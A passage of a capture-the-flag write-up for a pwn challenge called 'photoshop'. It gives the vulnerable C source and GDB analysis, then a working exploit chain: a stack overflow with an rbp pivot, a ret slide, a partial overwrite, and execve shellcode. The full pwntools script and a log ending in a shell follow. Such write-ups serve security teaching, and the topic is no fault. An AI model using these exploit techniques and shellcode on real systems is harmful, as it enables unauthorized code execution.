<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_SIZE 0x100000</span>
                   <span class="hljs-number">0x100030</span>

<span class="hljs-type">char</span> *image;

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>{
    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);
    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to the best image editing software!\n&quot;</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Loading image...\n&quot;</span>);
    sleep(<span class="hljs-number">3</span>);

    image = mmap((<span class="hljs-type">void</span> *)<span class="hljs-number">0x10000</span>, IMAGE_SIZE, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);

    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;./icon.png&quot;</span>, O_RDONLY);
    mprotect(image, IMAGE_SIZE, (PROT_READ|PROT_WRITE) &amp; <span class="hljs-number">7</span>);
    <span class="hljs-type">int</span> read_chars = read(fd, image, IMAGE_SIZE);

    <span class="hljs-keyword">if</span>(read_chars &lt; <span class="hljs-number">0</span>){
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Something went wrong! Open a ticket.\n&quot;</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
    }

    <span class="hljs-type">int</span> value = <span class="hljs-number">0</span>, index = <span class="hljs-number">0</span>;
    <span class="hljs-type">char</span> buffer[<span class="hljs-number">0x10</span>];

    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You can edit one pixel!\n&quot;</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter in the index you want to edit: &quot;</span>);

    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%u&quot;</span>, &amp;index);

    <span class="hljs-keyword">if</span>(index &gt;= IMAGE_SIZE || index &lt; <span class="hljs-number">0</span>){
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Invalid!\n&quot;</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    }

    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter in the value: &quot;</span>);
    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;value);

    image[index] = (<span class="hljs-type">char</span>)value;

    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Edit successful!\n&quot;</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Saving image...\n&quot;</span>);
    sleep(<span class="hljs-number">3</span>);

    mprotect(image, IMAGE_SIZE, ~(PROT_WRITE) &amp; <span class="hljs-number">7</span>); <span class="hljs-comment">// PROT_READ | PROT_EXEC</span>

    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter in a review? &quot;</span>);
    read(<span class="hljs-number">0</span>, buffer, <span class="hljs-number">0x108</span>);
}
</code></pre>
<h3 id="binary-analysis"tabindex="-1">Binary Analysis</h3>
<p>Disassembling <code>main</code> in GDB, we notice a key things:</p>
<pre class="hljs"><code>   0x0000555555555266 &lt;+157&gt;:	mov    DWORD PTR [rbp-0x4],eax
   0x0000555555555269 &lt;+160&gt;:	mov    rax,QWORD PTR [rip+0x2e10]        # 0x555555558080 &lt;image&gt;
   0x0000555555555270 &lt;+167&gt;:	mov    edx,0x3
   0x0000555555555275 &lt;+172&gt;:	mov    esi,0x100000
   0x000055555555527a &lt;+177&gt;:	mov    rdi,rax
   0x000055555555527d &lt;+180&gt;:	call   0x555555555090 &lt;mprotect@plt&gt;
   0x0000555555555282 &lt;+185&gt;:	mov    rcx,QWORD PTR [rip+0x2df7]        # 0x555555558080 &lt;image&gt;
   0x0000555555555289 &lt;+192&gt;:	mov    eax,DWORD PTR [rbp-0x4]
   0x000055555555528c &lt;+195&gt;:	mov    edx,0x100000
   0x0000555555555291 &lt;+200&gt;:	mov    rsi,rcx
   0x0000555555555294 &lt;+203&gt;:	mov    edi,eax
   0x0000555555555296 &lt;+205&gt;:	call   0x555555555070 &lt;read@plt&gt;
   0x000055555555529b &lt;+210&gt;:	mov    DWORD PTR [rbp-0x8],eax
   0x000055555555529e &lt;+213&gt;:	cmp    DWORD PTR [rbp-0x8],0x0
</code></pre>
<p>When <code>read</code> is called, <code>[rbp-0x4]</code> is placed into the <code>int fd</code> argument of <code>read</code>. Hence, if we can control <code>rbp</code>, we can set <code>rbp-4</code> to a region with a DWORD null to read from <code>stdin</code>.</p>
<pre class="hljs"><code>   0x00005555555553cd &lt;+516&gt;:	lea    rax,[rbp-0x20]
   0x00005555555553d1 &lt;+520&gt;:	mov    edx,0x108
   0x00005555555553d6 &lt;+525&gt;:	mov    rsi,rax
   0x00005555555553d9 &lt;+528&gt;:	mov    edi,0x0
   0x00005555555553de &lt;+533&gt;:	call   0x555555555070 &lt;read@plt&gt;
   0x00005555555553e3 &lt;+538&gt;:	mov    eax,0x0
   0x00005555555553e8 &lt;+543&gt;:	leave
=&gt; 0x00005555555553e9 &lt;+544&gt;:	ret
</code></pre>
<p>When <code>read</code> is called again to give us our buffer overflow, it reads from <code>stdin</code> at <code>[rbp-0x20]</code>. This means that <code>rbp-0x20</code> must be a writable region.</p>
<p>Let us now look at the <code>icon.png</code> after it has been read into the memory region:</p>
<pre class="hljs"><code>0x10000:	0x0a1a0a0d474e500a	0x524448490d000000
0x10010:	0xd0070000d0070000	0xc4389a0000000608
0x10020:	0x5948700900000079	0x0b0000120b000073
</code></pre>
<p>At offset 0x20, we notice that there is a three byte null followed by one non-null byte:</p>
<pre class="hljs"><code>0x10020 0x00000079
</code></pre>
<p>Remember that we have a one-byte modification that we can use. This will come in handy.</p>
<p>Now, let us look at the stack after return address in <code>main</code>:</p>
<pre class="hljs"><code>$rsp  0x7fffffffd158|+0x0000|+000: 0x00007ffff7dbb5f5 &lt;__libc_start_call_main+0x75&gt;  -&gt;  0xe800018f84e8c789  &lt;-  retaddr[1]
      0x7fffffffd160|+0x0008|+001: 0x00007fffffffd1a0  -&gt;  0x00007ffff7ffd000 &lt;_rtld_local&gt;  -&gt;  0x00007ffff7ffe310  -&gt;  ...
      0x7fffffffd168|+0x0010|+002: 0x00007fffffffd278  -&gt;  0x00007fffffffd75b  -&gt;  0x696e2f656d6f682f '/home/nikolawinata/Documents/ctf/sieberr/finals/photoshop/photos[...]'  &lt;-  $r12
      0x7fffffffd170|+0x0018|+003: 0x0000000155554040
      0x7fffffffd178|+0x0020|+004: 0x00005555555551c9 &lt;main&gt;  -&gt;  0x20ec8348e5894855
      0x7fffffffd180|+0x0028|+005: 0x0000000000000000
      0x7fffffffd188|+0x0030|+006: 0xd12b509077521445
</code></pre>
<p>We can see that 4 QWORDs away from the return address, there is a pointer to <code>main</code>. If we had a ret slide up to that point in the stack, we could potentially partial overwrite the address pointer to return to any part of <code>main</code>.</p>
<p>Finally, let us look at <code>icon.png</code>:</p>
<pre class="hljs"><code>00000840   59 1D 56 01  DC 7B CE 0A  ED D5 22 B8  94 B1 C6 7B  F2 E7 F0 99  2C 82 67 FA  Y.V..{....&quot;....{....,.g.
00000858   22 FD 56 5F  D4 56 ED AB  F8 28 E9 FA  F4 E7 A8 BF  EB 93 B2 B2  4D EB 41 6C  &quot;.V_.V...(..........M.Al
00000870   68 FF 32 5B  BB B6 8F 48  77 16 47 A4  63 A7 CF 55  4E F2 85 10  72 2D 27 5F  h.2[...Hw.G.c..UN...r-'_
00000888   92 2B AC 88  C3 2B F0 64  FA 47 92 6F  95 3B 56 95  6A 1C D5 C4  E3 A9 71 20  .+...+.d.G.o.;V.j.....q 
---  icon.png       --0x88C/0x5CE64--1%--------------------------------------------------------------------------
</code></pre>
<p>Notice that there is a <code>0xc3</code> byte at <code>0x88c</code>. In x86_64 assembly, <code>0xc3</code> is the opcode for a <code>ret</code> instruction. This means that we can use <code>image_base=0x10000+0x88c</code> as a <code>ret</code> gadget to ret-slide into the <code>main</code> pointer.</p>
<p>We have everything we need to formulate our exploit now.</p>
<h3 id="exploit-formulation"tabindex="-1">Exploit Formulation</h3>
<h4 id="setting-up-a-read-into-the-image-memory-region"tabindex="-1">Setting up a read into the image memory region</h4>
<p>We will try to accomplish the following steps:</p>
<ol>
<li>Turn our three-byte null into a four-byte null at offset 0x20</li>
<li>During our buffer overflow, we can then pivot <code>rbp</code> to <code>image_base + 0x24</code>, setting <code>[rbp-0x4]</code> to an <code>(int)0</code> that will be passed into our 0x1000 large read.</li>
<li>With four <code>ret</code>s, we can then partial overwrite the <code>main</code> pointer to return to the instruction just as <code>main</code> executes an <code>mprotect</code> to change the protections of the memory region from read-exec to read-write.</li>
</ol>
<pre class="hljs"><code>ret = <span class="hljs-number">0x1088c</span>
partial = <span class="hljs-number">0x5269</span>
rbp = <span class="hljs-number">0x10024</span>

<span class="hljs-comment"># p = process()</span>
<span class="hljs-comment"># gdb.attach(p)</span>
p = remote(<span class="hljs-string">&#x27;finals1.sieberr.live&#x27;</span>, <span class="hljs-number">15003</span>)

payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x20</span>
payload += pack(rbp)
payload += pack(ret) * <span class="hljs-number">4</span>
payload += p16(partial)

p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x20</span>).encode())
p.sendline(<span class="hljs-string">b&#x27;0&#x27;</span>)
p.sendafter(<span class="hljs-string">b&#x27;review? &#x27;</span>, payload)
</code></pre>
<pre class="hljs"><code>-&gt; 0x555555555296 e8d5fdffff            &lt;main+0xcd&gt;   call   0x555555555070 &lt;read@plt&gt;

   -&gt; 0x555555555070 ff25aa2f0000          &lt;read@plt&gt;   jmp    QWORD PTR [rip + 0x2faa] # 0x555555558020 &lt;read@got[plt]&gt;
      0x555555555076 6804000000            &lt;read@plt+0x6&gt;   push   0x4
      0x55555555507b e9a0ffffff            &lt;read@plt+0xb&gt;   jmp    0x555555555020
      0x555555555080 ff25a22f0000          &lt;__isoc23_scanf@plt&gt;   jmp    QWORD PTR [rip + 0x2fa2] # 0x555555558028 &lt;__isoc23_scanf@got.plt&gt;
      0x555555555086 6805000000            &lt;__isoc23_scanf@plt+0x6&gt;   push   0x5
      0x55555555508b e990ffffff            &lt;__isoc23_scanf@plt+0xb&gt;   jmp    0x555555555020

    0x55555555529b 8945f8                &lt;main+0xd2&gt;   mov    DWORD PTR [rbp - 0x8], eax
    0x55555555529e 837df800              &lt;main+0xd5&gt;   cmp    DWORD PTR [rbp - 0x8], 0x0
    0x5555555552a2 7919                  &lt;main+0xd9&gt;   jns    0x5555555552bd &lt;main+0xf4&gt;
    0x5555555552a4 488d05a50d0000        &lt;main+0xdb&gt;   lea    rax, [rip + 0xda5] # 0x555555556050
    0x5555555552ab 4889c7                &lt;main+0xe2&gt;   mov    rdi, rax
----------------------------------------------------------------------------------------------------- arguments (from block) ----
0x7ffff7e9fd00 &lt;__GI___libc_read&gt; (
   int fd = 0x0000000000000000,
   void* buf = 0x0000000000010000  -&gt;  0x0a1a0a0d474e5089,
   size_t nbytes = 0x0000000000100000  -&gt;  0x0000000000000000,
)
</code></pre>
<p>Success! we have <code>read(0, 0x10000, 0x100000)</code> now. This means we can now craft a payload to return into an <code>execve</code> shellcode.</p>
<h4 id="ret2execve"tabindex="-1">ret2execve</h4>
<p>Since we have pivoted <code>rbp</code> to the image memory region, there are a few things we must note:</p>
<ol>
<li>After <code>leave; ret</code> was executed in main, <code>rsp</code> now also lives in the image memory region.</li>
<li>Hence, the return address also lives in the image memory region, particularly at <code>image_base+0x24+8</code> since <code>rbp</code> was pivoted to <code>image_base+0x24</code>.</li>
<li>This means that when we are given the large read, we must not only read in our shellcode, we must also set up the stack for us to return to our shellcode.</li>
<li>Since our shellcode is executed <strong>after</strong> the memory region is set to read-exec, it cannot use <code>push</code> or any other stack operations lest we segfault due to lack of write permissions.</li>
</ol>
<p>We can craft an <code>execve</code> shellcode quickly:</p>
<pre class="hljs"><code>shellcode = asm(
    <span class="hljs-string">&#x27;&#x27;&#x27;
    xor     rax, rax                
    mov     rbx, 65536
    mov     rdi, rbx                
    
    xor     rsi, rsi                
    xor     rdx, rdx                

    mov     al, 59                  
    syscall
    &#x27;&#x27;&#x27;</span>
)
</code></pre>
<p>As the usual convention is to <code>push rbx=binsh_pointer</code> to the stack and then use <code>rsp</code> as a pointer to our <code>/bin/sh</code> string, we must instead place our <code>/bin/sh</code> string at <code>image_base</code> and then use <code>image_base</code> as a pointer in <code>rdi</code>.</p>
<p>We can then craft our payload to return to the address in the image memory region where we place our shellcode:</p>
<pre class="hljs"><code>payload = <span class="hljs-string">b&#x27;/bin/sh\0&#x27;</span>
payload = payload.ljust(<span class="hljs-number">0x24</span> + <span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;A&#x27;</span>)
payload += pack(rbp+<span class="hljs-number">16</span>)
payload += <span class="hljs-string">b&#x27;\x90&#x27;</span> * <span class="hljs-number">0x50</span>
payload += shellcode

time.sleep(<span class="hljs-number">0.5</span>)

p.send(payload)
</code></pre>
<p>After entering some mock values for the byte modification prompt and the buffer overflow read (both of which we do not need), we get our shell!</p>
<pre class="hljs"><code>[DEBUG] Sent 0x9b bytes:
    00000000  2f 62 69 6e  2f 73 68 00  41 41 41 41  41 41 41 41  │/bin│/sh·│AAAA│AAAA│
    00000010  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000020  41 41 41 41  41 41 41 41  41 41 41 41  34 00 01 00  │AAAA│AAAA│AAAA│4···│
    00000030  00 00 00 00  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
    00000040  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
    *
    00000080  90 90 90 90  48 31 c0 48  c7 c3 00 00  01 00 48 89  │····│H1·H│····│··H·│
    00000090  df 48 31 f6  48 31 d2 b0  3b 0f 05                  │·H1·│H1··│;··│
    0000009b
[DEBUG] Sent 0x5 bytes:
    b'1000\n'
[DEBUG] Sent 0x2 bytes:
    b'0\n'
[DEBUG] Sent 0x1 bytes:
    b'\n'
[*] Switching to interactive mode
[DEBUG] Received 0x72 bytes:
    b'You can edit one pixel!\n'
    b'Enter in the index you want to edit: Enter in the value: Edit successful!\n'
    b'Saving image...\n'
You can edit one pixel!
Enter in the index you want to edit: Enter in the value: Edit successful!
Saving image...
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x13 bytes:
    b'Enter in a review? '
Enter in a review? [DEBUG] Received 0x2b bytes:
    b'icon.png  photoshop  photoshop.c  solve.py\n'
icon.png  photoshop  photoshop.c  solve.py
$
</code></pre>
<h3 id="full-exploit"tabindex="-1">Full exploit</h3>
<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time

elf = context.binary = ELF(<span class="hljs-string">&quot;./photoshop&quot;</span>)
context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
context.terminal = <span class="hljs-string">&#x27;kitty&#x27;</span>

ret = <span class="hljs-number">0x1088c</span>
partial = <span class="hljs-number">0x5269</span>
rbp = <span class="hljs-number">0x10024</span>

p = process()
<span class="hljs-comment"># gdb.attach(p)</span>
<span class="hljs-comment"># p = remote(&#x27;finals1.sieberr.live&#x27;, 15003)</span>

shellcode = asm(
    <span class="hljs-string">&#x27;&#x27;&#x27;
    xor     rax, rax                
    mov     rbx, 65536
    mov     rdi, rbx                
    
    xor     rsi, rsi                
    xor     rdx, rdx                

    mov     al, 59                  
    syscall
    &#x27;&#x27;&#x27;</span>
)

payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x20</span>
payload += pack(rbp)
payload += pack(ret) * <span class="hljs-number">4</span>
payload += p16(partial)

p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x20</span>).encode())
p.sendline(<span class="hljs-string">b&#x27;0&#x27;</span>)
p.sendafter(<span class="hljs-string">b&#x27;review? &#x27;</span>, payload)

payload = <span class="hljs-string">b&#x27;/bin/sh\0&#x27;</span>
payload = payload.ljust(<span class="hljs-number">0x24</span> + <span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;A&#x27;</span>)
payload += pack(rbp+<span class="hljs-number">16</span>)
payload += <span class="hljs-string">b&#x27;\x90&#x27;</span> * <span class="hljs-number">0x50</span>
payload += shellcode

time.sleep(<span class="hljs-number">0.5</span>)

p.send(payload)

p.sendline(<span class="hljs-string">b&#x27;1000&#x27;</span>)
p.sendline(<span class="hljs-string">b&#x27;0&#x27;</span>)
p.send(<span class="hljs-string">b&#x27;\n&#x27;</span>)

p.interactive()
</code></pre>

      </section>
      <section id="article-navigation">
        
        
      </section>
      <section id="article-list-button-container">
        <a href="/articles.html">
          <div id="article-list-button">📚</div>
        </a>
      </section>
    </article>
  </main>


